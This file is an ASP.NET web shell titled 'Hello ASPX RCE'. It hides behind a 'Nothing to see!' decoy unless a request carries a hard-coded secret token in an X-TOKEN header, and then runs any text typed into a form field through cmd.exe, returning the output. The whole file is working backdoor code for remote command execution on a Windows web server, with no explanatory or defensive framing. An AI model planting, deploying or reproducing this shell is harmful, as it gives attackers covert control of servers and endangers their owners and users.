<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
        HttpContext httpContext = HttpContext.Current;
        string token = httpContext.Request.Headers["X-TOKEN"];
         if (!String.IsNullOrEmpty(token)&&token.Equals("9ebc314e6dacf0a6ab1c08c444b3deb50338b188a70cad862a6482d1ae0e5be2"))
        {
           // Response.Write("oke");
        }
        else
        {
            Response.Write("Nothing to see!");
            Response.End();
        }
}
string abc(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
//this is comment
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}

void xyz(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(abc(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>Hello ASPX RCE</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 445px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 705px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="xyz"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 300px; POSITION: absolute; TOP: 22px" runat="server">Enter your command:</asp:Label>
</form>
</body>
</HTML>
